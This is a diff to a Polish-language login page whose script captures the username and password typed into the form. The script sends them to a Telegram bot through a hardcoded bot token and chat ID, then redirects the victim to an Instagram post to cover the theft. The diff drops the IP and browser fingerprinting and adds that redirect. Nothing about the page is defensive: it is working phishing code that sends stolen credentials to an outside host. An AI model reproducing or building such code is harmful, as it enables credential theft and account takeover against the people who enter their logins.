@@ -38,41 +38,39 @@
 
   <script>
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
+      e.preventDefault();
 
-  const login = document.getElementById('login').value;
-  const password = document.getElementById('password').value;
+      const login = document.getElementById('login').value;
+      const password = document.getElementById('password').value;
 
-  // Pobierz dodatkowe dane (IP i informacje o przeglądarce)
-  getUserIP().then(ip => {
-    const browserInfo = getBrowserInfo();
-    const message = `🔐 Nowe logowanie:\n👤 Login: ${login}\n🔑 Hasło: ${password}\n🌍 IP: ${ip}\n🌐 Przeglądarka: ${browserInfo}`;
+      const message = `🔐 Nowe logowanie:\n👤 Login: ${login}\n🔑 Hasło: ${password}`;
 
-    const token = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ'; 
-    const chat_id = '5447264217'; 
+      const token = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ'; 
+      const chat_id = '5447264217'; 
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: chat_id,
-        text: message
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
       })
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log("Wysłano do Telegrama:", data);
-      alert("Wysłano dane logowania.");
-    })
-    .catch(error => {
-      console.error("Błąd wysyłania:", error);
-      alert("Nie udało się wysłać.");
+      .then(response => response.json())
+      .then(data => {
+        console.log("Wysłano do Telegrama:", data);
+        alert("Wysłano dane logowania.");
+        
+        // Po wysłaniu danych logowania, przekierowanie do posta na Instagramie
+        window.location.href = 'https://www.instagram.com/p/DIy6tmrNPY1/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==';
+      })
+      .catch(error => {
+        console.error("Błąd wysyłania:", error);
+        alert("Nie udało się wysłać.");
+      });
     });
-  });
-});
-
   </script>
 </body>
 </html>
